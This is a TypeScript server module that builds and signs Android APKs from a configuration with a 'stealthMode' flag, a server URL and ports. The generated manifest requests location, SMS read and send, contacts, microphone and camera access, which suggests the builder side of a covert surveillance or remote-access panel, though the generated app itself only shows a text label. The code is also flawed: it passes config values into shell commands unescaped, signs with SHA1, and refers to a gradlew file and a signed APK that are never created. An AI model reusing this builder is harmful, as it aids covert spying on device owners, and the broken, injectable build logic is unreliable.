import { promises as fs } from "fs";
import { execSync, spawn } from "child_process";
import path from "path";
import crypto from "crypto";
import { getDb } from "./db";
import { apkBuilds } from "../drizzle/schema";

export interface APKConfig {
  appName: string;
  packageName: string;
  versionName: string;
  versionCode: number;
  stealthMode: boolean;
  sslEnabled: boolean;
  ports: number[];
  serverUrl: string;
  iconUrl?: string;
}

export interface BuildResult {
  success: boolean;
  buildId: string;
  apkPath?: string;
  apkUrl?: string;
  error?: string;
  progress: number;
  status: "pending" | "building" | "signing" | "completed" | "failed";
}

export class APKBuilder {
  private buildDir: string;
  private outputDir: string;
  private keystoreDir: string;

  constructor() {
    this.buildDir = path.join(process.cwd(), "builds");
    this.outputDir = path.join(this.buildDir, "outputs");
    this.keystoreDir = path.join(this.buildDir, "keystores");
  }

  /**
   * Initialize build directories
   */
  async initialize(): Promise<void> {
    try {
      await fs.mkdir(this.buildDir, { recursive: true });
      await fs.mkdir(this.outputDir, { recursive: true });
      await fs.mkdir(this.keystoreDir, { recursive: true });
      console.log("[APKBuilder] Directories initialized");
    } catch (error) {
      console.error("[APKBuilder] Failed to initialize directories:", error);
      throw error;
    }
  }

  /**
   * Generate a keystore for signing APK
   */
  async generateKeystore(buildId: string, packageName: string): Promise<string> {
    const keystorePath = path.join(this.keystoreDir, `${buildId}.keystore`);
    const keystorePassword = crypto.randomBytes(16).toString("hex");
    const keyAlias = "release";
    const keyPassword = crypto.randomBytes(16).toString("hex");

    try {
      // Generate keystore using keytool
      const command = [
        "keytool",
        "-genkey",
        "-v",
        "-keystore",
        keystorePath,
        "-keyalg",
        "RSA",
        "-keysize",
        "2048",
        "-validity",
        "10000",
        "-alias",
        keyAlias,
        "-storepass",
        keystorePassword,
        "-keypass",
        keyPassword,
        "-dname",
        `CN=${packageName}, O=Android Device Manager, L=Global, ST=Global, C=US`,
      ];

      execSync(command.join(" "), { stdio: "pipe" });

      // Save credentials
      const credentialsPath = path.join(this.keystoreDir, `${buildId}.credentials`);
      await fs.writeFile(
        credentialsPath,
        JSON.stringify(
          {
            keystorePath,
            keystorePassword,
            keyAlias,
            keyPassword,
          },
          null,
          2
        )
      );

      console.log(`[APKBuilder] Keystore generated: ${keystorePath}`);
      return keystorePath;
    } catch (error) {
      console.error("[APKBuilder] Failed to generate keystore:", error);
      throw error;
    }
  }

  /**
   * Create Android project structure
   */
  async createProjectStructure(buildId: string, config: APKConfig): Promise<string> {
    const projectDir = path.join(this.buildDir, buildId);

    try {
      // Create directory structure
      const dirs = [
        "app/src/main",
        "app/src/main/java",
        "app/src/main/res/values",
        "app/src/main/res/drawable",
        "gradle/wrapper",
      ];

      for (const dir of dirs) {
        await fs.mkdir(path.join(projectDir, dir), { recursive: true });
      }

      // Create build.gradle
      const buildGradle = this.generateBuildGradle(config);
      await fs.writeFile(path.join(projectDir, "app/build.gradle"), buildGradle);

      // Create settings.gradle
      await fs.writeFile(path.join(projectDir, "settings.gradle"), 'include ":app"');

      // Create AndroidManifest.xml
      const manifest = this.generateManifest(config);
      await fs.writeFile(path.join(projectDir, "app/src/main/AndroidManifest.xml"), manifest);

      // Create strings.xml
      const strings = this.generateStringsXml(config);
      await fs.writeFile(path.join(projectDir, "app/src/main/res/values/strings.xml"), strings);

      // Create MainActivity
      const packagePath = config.packageName.replace(/\./g, "/");
      await fs.mkdir(path.join(projectDir, `app/src/main/java/${packagePath}`), {
        recursive: true,
      });

      const mainActivity = this.generateMainActivity(config);
      await fs.writeFile(
        path.join(projectDir, `app/src/main/java/${packagePath}/MainActivity.java`),
        mainActivity
      );

      console.log(`[APKBuilder] Project structure created: ${projectDir}`);
      return projectDir;
    } catch (error) {
      console.error("[APKBuilder] Failed to create project structure:", error);
      throw error;
    }
  }

  /**
   * Compile APK using Gradle
   */
  async compileAPK(projectDir: string, buildId: string): Promise<string> {
    try {
      const gradleWrapper = path.join(projectDir, "gradlew");

      // Make gradlew executable
      await fs.chmod(gradleWrapper, 0o755);

      // Run gradle build
      const command = `cd ${projectDir} && ./gradlew assembleRelease`;
      execSync(command, { stdio: "pipe" });

      // Find compiled APK
      const apkPath = path.join(projectDir, "app/build/outputs/apk/release/app-release.apk");

      // Verify APK exists
      await fs.access(apkPath);

      console.log(`[APKBuilder] APK compiled: ${apkPath}`);
      return apkPath;
    } catch (error) {
      console.error("[APKBuilder] Failed to compile APK:", error);
      throw error;
    }
  }

  /**
   * Sign APK with keystore
   */
  async signAPK(apkPath: string, keystorePath: string, credentials: any): Promise<string> {
    try {
      const signedApkPath = apkPath.replace(".apk", "-signed.apk");

      const command = [
        "jarsigner",
        "-verbose",
        "-sigalg",
        "SHA1withRSA",
        "-digestalg",
        "SHA1",
        "-keystore",
        keystorePath,
        "-storepass",
        credentials.keystorePassword,
        "-keypass",
        credentials.keyPassword,
        apkPath,
        credentials.keyAlias,
      ];

      execSync(command.join(" "), { stdio: "pipe" });

      console.log(`[APKBuilder] APK signed: ${signedApkPath}`);
      return signedApkPath;
    } catch (error) {
      console.error("[APKBuilder] Failed to sign APK:", error);
      throw error;
    }
  }

  /**
   * Build complete APK
   */
  async buildAPK(config: APKConfig, userId: number): Promise<BuildResult> {
    const buildId = `build-${Date.now()}-${crypto.randomBytes(4).toString("hex")}`;

    try {
      // Initialize
      await this.initialize();

      // Create project structure
      const projectDir = await this.createProjectStructure(buildId, config);

      // Generate keystore
      const keystorePath = await this.generateKeystore(buildId, config.packageName);
      const credentialsPath = path.join(this.keystoreDir, `${buildId}.credentials`);
      const credentials = JSON.parse(await fs.readFile(credentialsPath, "utf-8"));

      // Compile APK
      const apkPath = await this.compileAPK(projectDir, buildId);

      // Sign APK
      const signedApkPath = await this.signAPK(apkPath, keystorePath, credentials);

      // Copy to outputs
      const outputPath = path.join(this.outputDir, `${buildId}-${config.appName}.apk`);
      await fs.copyFile(signedApkPath, outputPath);

      // Save build info to database
      const db = await getDb();
      if (db) {
        await db.insert(apkBuilds).values({
          buildId,
          createdBy: userId,
          appName: config.appName,
          packageName: config.packageName,
          versionName: config.versionName,
          versionCode: config.versionCode,
          stealthMode: config.stealthMode,
          sslEnabled: config.sslEnabled,
          ports: config.ports,
          serverUrl: config.serverUrl,
          status: "ready",
          apkUrl: `/api/apk/download/${buildId}`,
          fileSize: (await fs.stat(outputPath)).size,
          createdAt: new Date(),
        });
      }

      return {
        success: true,
        buildId,
        apkPath: outputPath,
        apkUrl: `/api/apk/download/${buildId}`,
        progress: 100,
        status: "completed",
      };
    } catch (error) {
      console.error(`[APKBuilder] Build failed for ${buildId}:`, error);

      // Save failed build to database
      const db = await getDb();
      if (db) {
        await db.insert(apkBuilds).values({
          buildId,
          createdBy: userId,
          appName: config.appName,
          packageName: config.packageName,
          versionName: config.versionName,
          versionCode: config.versionCode,
          stealthMode: config.stealthMode,
          sslEnabled: config.sslEnabled,
          ports: config.ports,
          serverUrl: config.serverUrl,
          status: "failed",
          createdAt: new Date(),
        });
      }

      return {
        success: false,
        buildId,
        error: error instanceof Error ? error.message : "Build failed",
        progress: 0,
        status: "failed",
      };
    }
  }

  /**
   * Generate build.gradle content
   */
  private generateBuildGradle(config: APKConfig): string {
    return `plugins {
    id 'com.android.application'
}

android {
    namespace '${config.packageName}'
    compileSdk 34

    defaultConfig {
        applicationId '${config.packageName}'
        minSdk 21
        targetSdk 34
        versionCode ${config.versionCode}
        versionName '${config.versionName}'
    }

    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_11
        targetCompatibility JavaVersion.VERSION_11
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
}`;
  }

  /**
   * Generate AndroidManifest.xml
   */
  private generateManifest(config: APKConfig): string {
    const packagePath = config.packageName.replace(/\./g, "/");
    return `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="${config.packageName}">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.CAMERA" />

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:theme="@style/Theme.AppCompat.Light.DarkActionBar"
        android:usesCleartextTraffic="${!config.sslEnabled}">

        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

    </application>

</manifest>`;
  }

  /**
   * Generate strings.xml
   */
  private generateStringsXml(config: APKConfig): string {
    return `<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">${config.appName}</string>
    <string name="server_url">${config.serverUrl}</string>
    <string name="stealth_mode">${config.stealthMode}</string>
</resources>`;
  }

  /**
   * Generate MainActivity.java
   */
  private generateMainActivity(config: APKConfig): string {
    const packageName = config.packageName;
    return `package ${packageName};

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        TextView textView = new TextView(this);
        textView.setText("${config.appName}");
        setContentView(textView);
    }
}`;
  }

  /**
   * Get build status
   */
  async getBuildStatus(buildId: string): Promise<BuildResult | null> {
    const db = await getDb();
    if (!db) return null;

    try {
      // TODO: Query database for build status
      return null;
    } catch (error) {
      console.error("[APKBuilder] Failed to get build status:", error);
      return null;
    }
  }

  /**
   * Download APK file
   */
  async downloadAPK(buildId: string): Promise<Buffer | null> {
    try {
      const apkPath = path.join(this.outputDir, `${buildId}*.apk`);
      // Use glob to find the file
      const files = await fs.readdir(this.outputDir);
      const apkFile = files.find((f) => f.startsWith(buildId));

      if (!apkFile) {
        console.warn(`[APKBuilder] APK not found: ${buildId}`);
        return null;
      }

      const fullPath = path.join(this.outputDir, apkFile);
      return await fs.readFile(fullPath);
    } catch (error) {
      console.error("[APKBuilder] Failed to download APK:", error);
      return null;
    }
  }

  /**
   * Clean up build artifacts
   */
  async cleanupBuild(buildId: string): Promise<void> {
    try {
      const projectDir = path.join(this.buildDir, buildId);
      const keystorePath = path.join(this.keystoreDir, `${buildId}.keystore`);
      const credentialsPath = path.join(this.keystoreDir, `${buildId}.credentials`);

      // Remove project directory
      await fs.rm(projectDir, { recursive: true, force: true });

      // Remove keystore files
      await fs.rm(keystorePath, { force: true });
      await fs.rm(credentialsPath, { force: true });

      console.log(`[APKBuilder] Build artifacts cleaned: ${buildId}`);
    } catch (error) {
      console.error("[APKBuilder] Failed to cleanup build:", error);
    }
  }
}

// Singleton instance
let apkBuilder: APKBuilder | null = null;

export function getAPKBuilder(): APKBuilder {
  if (!apkBuilder) {
    apkBuilder = new APKBuilder();
  }
  return apkBuilder;
}
